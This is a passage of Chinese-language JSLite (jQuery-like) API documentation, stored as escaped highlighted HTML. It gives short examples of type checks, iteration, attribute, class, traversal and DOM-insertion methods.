class=\"nx\">isObject</span><span class=\"p\">({})</span>  <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.isPlainObject</h3>\n\n<p>$.isPlainObject(object)   ⇒ boolean&lt;br&gt;<br>\n如果通过 \"{}\" 或者 \"new Object\" 创建的则返回true。判断对象是否是纯粹的对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isPlainObject</span><span class=\"p\">({})</span>         <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isPlainObject</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nb\">Object</span><span class=\"p\">)</span> <span class=\"c1\">// =&gt; true</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isPlainObject</span><span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nb\">Date</span><span class=\"p\">)</span>   <span class=\"c1\">// =&gt; false</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isPlainObject</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">)</span>     <span class=\"c1\">// =&gt; false</span>\n</pre></div>\n\n<h3>$.isArray</h3>\n\n<p>判断是否为 [数组] 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isArray</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">])</span>  <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.isJson</h3>\n\n<p>判断是否为 [数组] 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isJson</span><span class=\"p\">({})</span>  <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.isContainsNode</h3>\n\n<p>parent是否包含node节点对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">isContainsNode</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">],</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\".boxss\"</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">])</span> <span class=\"c1\">//⇒ parent是否包含node节点对象</span>\n</pre></div>\n\n<h3>$.likeArray</h3>\n\n<p>判断对象是否为数组或者是字符。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">likeArray</span><span class=\"p\">([</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">])</span>     <span class=\"c1\">//⇒ true</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">likeArray</span><span class=\"p\">(</span><span class=\"s2\">\"222\"</span><span class=\"p\">)</span>  <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>$.type</h3>\n\n<p>获取JavaScript 对象的类型。可能的类型有： <code>null</code> <code>undefined</code> <code>boolean</code> <code>number</code> <code>string</code> <code>function</code> <code>array</code> <code>date</code> <code>regexp</code> <code>object</code> <code>error</code> 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">)</span>  <span class=\"c1\">//⇒ Boolean</span>\n<span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ String</span>\n</pre></div>\n\n<h3>$.matches</h3>\n\n<p>如果当前节点能被指定的css选择器查找到，则返回<code>true</code>，否则返回<code>false</code>。<code>$.matches(element, selector)</code>。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">matches</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">],</span> <span class=\"s2\">\"#box\"</span><span class=\"p\">)</span>\n<span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<hr>\n\n<h2>对象访问</h2>\n\n<h3>each</h3>\n\n<p>遍历一个 JSLite 集合对象，为每一个匹配元素执行一个函数。this关键字指向当前item(作为函数的第二个参数传递)。如果函数返回 false，遍历结束。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"img\"</span><span class=\"p\">).</span><span class=\"nx\">each</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">){</span>\n    <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span> <span class=\"s2\">\"test\"</span> <span class=\"o\">+</span> <span class=\"nx\">i</span> <span class=\"o\">+</span> <span class=\"s2\">\".jpg\"</span><span class=\"p\">;</span>\n<span class=\"p\">});</span>\n<span class=\"c1\">//⇒ 找到所有的img对象给设置src  </span>\n<span class=\"c1\">//⇒ 返回 [ &lt;img src=\"test0.jpg\" /&gt;, &lt;img src=\"test1.jpg\" /&gt; ]</span>\n</pre></div>\n\n<h3>map</h3>\n\n<p>遍历节点对象集合中的所有节点对象返回一个新的集合对象</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\".box\"</span><span class=\"p\">).</span><span class=\"nx\">map</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">item</span><span class=\"p\">){</span>\n    <span class=\"k\">return</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">()</span>\n<span class=\"p\">})</span>\n<span class=\"c1\">//⇒ 返回 [\"12boxOne\", \"6\", \"11\", \"22123456\", \"7123123\"]</span>\n</pre></div>\n\n<h3>forEach</h3>\n\n<p>类似 each，forEach遍历不会停止。</p>\n<div class=\"highlight\"><pre><span class=\"c1\">//遍历数组</span>\n<span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">2</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">].</span><span class=\"nx\">forEach</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">,</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">array</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n<span class=\"c1\">//遍历节点</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"img\"</span><span class=\"p\">).</span><span class=\"nx\">forEach</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">item</span><span class=\"p\">,</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">array</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">d</span><span class=\"p\">)</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<h3>get</h3>\n\n<p>当前对象集合中获取所有节点对象或单个节点对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">).</span><span class=\"nx\">get</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"c1\">//⇒ 返回节点 &lt;div id=\"box\" class=\"boxOne box2 box3\" &gt;&lt;/div&gt;</span>\n</pre></div>\n\n<h3>indexOf</h3>\n\n<p>在当前获取的节点数组中获取一个元素在这个数组的位置。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">).</span><span class=\"nx\">indexOf</span><span class=\"p\">(</span><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">)[</span><span class=\"mi\">0</span><span class=\"p\">])</span>\n<span class=\"c1\">//⇒ 2</span>\n</pre></div>\n\n<h3>length</h3>\n\n<p>对象中元素的个数。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"img\"</span><span class=\"p\">).</span><span class=\"nx\">length</span><span class=\"p\">;</span>\n<span class=\"c1\">//⇒ 2</span>\n</pre></div>\n\n<hr>\n\n<h2>HTML代码/文本/值</h2>\n\n<h3>text</h3>\n\n<p>取得所有匹配节点对象的文本内容。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">text</span><span class=\"p\">()</span>\n<span class=\"c1\">//⇒ string 返回文本</span>\n</pre></div>\n\n<h3>html</h3>\n\n<p>获取或设置节点对象内容。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">html</span><span class=\"p\">()</span>\n<span class=\"c1\">//⇒ string 返回包括HTML的文本</span>\n</pre></div>\n\n<h3>val</h3>\n\n<p>获取设置input的 value 。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'input'</span><span class=\"p\">).</span><span class=\"nx\">val</span><span class=\"p\">()</span> <span class=\"c1\">//⇒ string </span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'input'</span><span class=\"p\">).</span><span class=\"nx\">val</span><span class=\"p\">(</span><span class=\"s1\">'test'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self </span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#input'</span><span class=\"p\">).</span><span class=\"nx\">val</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">oldvalue</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">index</span><span class=\"p\">,</span><span class=\"nx\">oldvalue</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"s1\">'111'</span> <span class=\"o\">+</span> <span class=\"nx\">oldvalue</span>\n<span class=\"p\">})</span> <span class=\"c1\">//⇒ self</span>\n</pre></div>\n\n<hr>\n\n<h2>节点属性</h2>\n\n<h3>pluck</h3>\n\n<p>获取对象集合中每一个元素的属性值。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">pluck</span><span class=\"p\">(</span><span class=\"s2\">\"nodeName\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ [\"DIV\"]</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">pluck</span><span class=\"p\">(</span><span class=\"s2\">\"nextElementSibling\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ &lt;div class=\"boxs\"&gt;1234567890&lt;/div&gt;</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">pluck</span><span class=\"p\">(</span><span class=\"s1\">'children'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ [HTMLCollection[4]]</span>\n</pre></div>\n\n<h3>attr</h3>\n\n<p>读取或设置dom的属性。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\".button\"</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">({</span><span class=\"s2\">\"class\"</span><span class=\"o\">:</span><span class=\"s2\">\"\"</span><span class=\"p\">,</span><span class=\"s2\">\"style\"</span><span class=\"o\">:</span><span class=\"s2\">\"background:red\"</span><span class=\"p\">})</span> <span class=\"c1\">//⇒ self 设置红色清空class</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\".button\"</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">\"class\"</span><span class=\"p\">,</span><span class=\"s2\">\"name\"</span><span class=\"p\">)</span>  <span class=\"c1\">//⇒ self 设置class替换之前的</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\".button\"</span><span class=\"p\">).</span><span class=\"nx\">attr</span><span class=\"p\">(</span><span class=\"s2\">\"class\"</span><span class=\"p\">)</span>  <span class=\"c1\">//⇒ string 获取class属性值</span>\n</pre></div>\n\n<h3>removeAttr</h3>\n\n<p>移动当前对象集合中所有元素的指定属性。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">removeAttr</span><span class=\"p\">(</span><span class=\"s2\">\"class\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self 移除class</span>\n</pre></div>\n\n<hr>\n\n<h2>CSS 类</h2>\n\n<h3>css</h3>\n\n<p>获取或设置节点对象的style样式内容。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">css</span><span class=\"p\">(</span><span class=\"s1\">'color'</span><span class=\"p\">,</span><span class=\"s1\">'yellow'</span><span class=\"p\">)</span>     <span class=\"c1\">//⇒ self 返回Array 节点内容</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">css</span><span class=\"p\">({</span><span class=\"s1\">'color'</span><span class=\"o\">:</span><span class=\"s1\">'yellow'</span><span class=\"p\">})</span>   <span class=\"c1\">//⇒ self 返回Array 节点内容</span>\n</pre></div>\n\n<h3>hasClass</h3>\n\n<p>集合中是否有节点对象含有指定的class。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">hasClass</span><span class=\"p\">(</span><span class=\"s1\">'box2'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ true</span>\n</pre></div>\n\n<h3>addClass</h3>\n\n<p>为每个匹配的节点对象添加指定的class类名。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">addClass</span><span class=\"p\">(</span><span class=\"s1\">'box23'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self 原有对象class上添加 box23</span>\n</pre></div>\n\n<h3>removeClass</h3>\n\n<p>清除节点对象中所有节点对象的指定class类名，不填写清空。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">removeClass</span><span class=\"p\">(</span><span class=\"s1\">'box23'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self 删除原有对象class中box23</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">).</span><span class=\"nx\">removeClass</span><span class=\"p\">()</span> <span class=\"c1\">//⇒ self  所有匹配的对象class属性被删除</span>\n</pre></div>\n\n<h3>toggleClass</h3>\n\n<p>在匹配的节点对象集合中的每个节点对象上添加或删除一个或多个样式类。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">toggleClass</span><span class=\"p\">(</span><span class=\"s1\">'box1 box2'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self 原有对象class上添加 \"box1 box2\"或者删除\"box1 box2\"</span>\n</pre></div>\n\n<hr>\n\n<h2>效果</h2>\n\n<h3>toggle</h3>\n\n<p>显示或隐藏匹配节点对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">toggle</span><span class=\"p\">()</span> <span class=\"c1\">//⇒ self 原有对象如果隐藏就显示，如果显示就隐藏。</span>\n</pre></div>\n\n<h3>show</h3>\n\n<p>显示匹配节点对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">show</span><span class=\"p\">()</span> <span class=\"c1\">//⇒ self 显示匹配节点对象</span>\n</pre></div>\n\n<h3>hide</h3>\n\n<p>隐藏匹配节点对象。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">hide</span><span class=\"p\">()</span> <span class=\"c1\">//⇒ self 隐藏匹配的对象</span>\n</pre></div>\n\n<hr>\n\n<h2>尺寸位置</h2>\n\n<h3>offset</h3>\n\n<p>获得当前元素相对于document的位置。返回一个对象含有：left|top|width|height</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">offset</span><span class=\"p\">()</span>  <span class=\"c1\">//⇒Object {left: 8, top: 8, width: 1260, height: 0}</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">offset</span><span class=\"p\">().</span><span class=\"nx\">left</span>  <span class=\"c1\">//⇒  8</span>\n</pre></div>\n\n<h3>width</h3>\n\n<p>width()   ⇒ number&lt;/br&gt;<br>\nwidth(value)   ⇒ self&lt;/br&gt;<br>\nwidth(function(index, oldWidth){ ... })   ⇒ self&lt;/br&gt;<br>\n获取对象象集合中第一个元素的宽，或设置对象集合所有元素的宽。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">).</span><span class=\"nx\">width</span><span class=\"p\">()</span>   <span class=\"c1\">// =&gt; 342</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">).</span><span class=\"nx\">width</span><span class=\"p\">()</span>   <span class=\"c1\">// =&gt; 456 (可视区域宽度)</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">width</span><span class=\"p\">()</span> <span class=\"c1\">// =&gt; dsf</span>\n</pre></div>\n\n<h3>height</h3>\n\n<p>height()   ⇒ number&lt;/br&gt;<br>\nheight(value)   ⇒ self&lt;/br&gt;<br>\nheight(function(index, oldWidth){ ... })   ⇒ self&lt;/br&gt;<br>\n获取对象象集合中第一个元素的高，或设置对象集合所有元素的高。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">).</span><span class=\"nx\">height</span><span class=\"p\">()</span>   <span class=\"c1\">// =&gt; 342</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">).</span><span class=\"nx\">height</span><span class=\"p\">()</span>   <span class=\"c1\">// =&gt; 456 (可视区域高度)</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">).</span><span class=\"nx\">height</span><span class=\"p\">()</span> <span class=\"c1\">// =&gt; dsf</span>\n</pre></div>\n\n<hr>\n\n<h2>过滤</h2>\n\n<h3>filter</h3>\n\n<p>筛选出与指定表达式匹配的元素集合。<code>filter(selector)</code>。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">).</span><span class=\"nx\">filter</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self 在所有的div对象中选择器为 #box 的过滤出来。</span>\n</pre></div>\n\n<h3>not</h3>\n\n<p>not(selector)   ⇒ collection&lt;br&gt;<br>\nnot(collection)   ⇒ collection&lt;br&gt;<br>\nnot(function(index){ ... })   ⇒ collection&lt;br&gt;<br>\n筛选出与 <code>非</code> 指定表达式匹配的元素集合。它的作用刚好与 <code>filter</code> 相反，返回。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#select option\"</span><span class=\"p\">).</span><span class=\"nx\">not</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">idx</span><span class=\"p\">){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selected</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">selected</span>\n<span class=\"p\">})</span>\n<span class=\"c1\">//⇒ [&lt;option value=\"3\"&gt;哈哈3&lt;/option&gt;]</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'input'</span><span class=\"p\">).</span><span class=\"nx\">not</span><span class=\"p\">(</span><span class=\"s1\">'#input'</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 返回除去 匹配到的#input</span>\n\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'input'</span><span class=\"p\">).</span><span class=\"nx\">not</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(){</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"p\">.</span><span class=\"nx\">type</span><span class=\"o\">==</span><span class=\"s1\">'text'</span>\n<span class=\"p\">})</span>\n</pre></div>\n\n<hr>\n\n<h2>删除节点</h2>\n\n<h3>empty</h3>\n\n<p>所有匹配节点对象集合中移除所有的dom子节点，不包括自己，清空内容。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">empty</span><span class=\"p\">()</span>\n<span class=\"c1\">//⇒ self &lt;div id=\"box\" class=\"boxOne box2 box3\" &gt;&lt;/div&gt;</span>\n</pre></div>\n\n<h3>remove</h3>\n\n<p>删除所有匹配节点对象 [自己] 及所有 [自己] 里面的内容。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">remove</span><span class=\"p\">()</span>\n<span class=\"c1\">//⇒ self &lt;div id=\"box\" class=\"boxOne box2 box3\" &gt;&lt;/div&gt;</span>\n</pre></div>\n\n<hr>\n\n<h2>查找节点</h2>\n\n<h3>find</h3>\n\n<p>后代节点的集合(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">find</span><span class=\"p\">()</span>        <span class=\"c1\">//⇒后代节点的集合</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">find</span><span class=\"p\">(</span><span class=\"s2\">\".box\"</span><span class=\"p\">)</span>  <span class=\"c1\">//⇒后代节点的集合，返回匹配'.box' 的集合</span>\n</pre></div>\n\n<h3>children</h3>\n\n<p>获得每个匹配元素集合元素的直接子元素(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">children</span><span class=\"p\">()</span>\n</pre></div>\n\n<h3>parent</h3>\n\n<p>对象集合中每个元素的直接父元素。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">parent</span><span class=\"p\">()</span>\n</pre></div>\n\n<h3>parents</h3>\n\n<p>获取对象集合每个元素所有的祖先元素（不包含根元素）。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">parents</span><span class=\"p\">()</span>\n</pre></div>\n\n<h3>prev</h3>\n\n<p>获取对象集合每个元素的所有上一个对象(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">prev</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>next</h3>\n\n<p>获取对象集合每个元素的所有下一个对象(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">next</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>prevAll</h3>\n\n<p>获取对此对象 [上] 所有兄弟对象(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">prevAll</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>nextAll</h3>\n\n<p>获取对此对象 [下] 所有兄弟对象(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">nextAll</span><span class=\"p\">(</span><span class=\"s2\">\"div\"</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>siblings</h3>\n\n<p>获取对此对象 [其它] 所有兄弟对象(可以带上滤选择器)。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">siblings</span><span class=\"p\">()</span>\n</pre></div>\n\n<hr>\n\n<h2>插入节点方法</h2>\n\n<h3>before</h3>\n\n<p>插入到标签开始前（兄弟节点的上面）。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">before</span><span class=\"p\">(</span><span class=\"s2\">\"dd\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self</span>\n</pre></div>\n\n<h3>prepend</h3>\n\n<p>插入到标签开始标记之后（里面的第一个）。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">prepend</span><span class=\"p\">(</span><span class=\"s2\">\"dd\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self</span>\n</pre></div>\n\n<h3>prependTo</h3>\n\n<p>prependTo(selector)   ⇒ self&lt;br&gt;<br>\n将生成的内容插入到匹配的节点标签开始标记之后。这有点像prepend，但是是相反的方式。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'&lt;div&gt;test&lt;/div&gt;'</span><span class=\"p\">).</span><span class=\"nx\">prependTo</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>append</h3>\n\n<p>插入到标签结束标记前（里面的结尾）。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">append</span><span class=\"p\">(</span><span class=\"s2\">\"dd\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ self</span>\n</pre></div>\n\n<h3>appendTo</h3>\n\n<p>appendTo(selector)   ⇒ self&lt;br&gt;<br>\n将生成的内容插入到匹配的元素标签结束标记前（里面的最后）。这个有点像append，但是插入的目标与其相反。</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'&lt;div&gt;test&lt;/div&gt;'</span><span class=\"p\">).</span><span class=\"nx\">appendTo</span><span class=\"p\">(</span><span class=\"s1\">'#box'</span><span class=\"p\">)</span>\n</pre></div>\n\n<h3>after</h3>\n\n<p>插入到标签结束标记后。（兄弟节点的下面）</p>\n<div class=\"highlight\"><pre><span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s2\">\"#box\"</span><span class=\"p\">).</span><span class=\"nx\">after</span><span class=\"p\">(</span><span class=\"s2\">\"dd\"</span><span class=\"p\">)</span> <span class=\"c1\">//⇒ 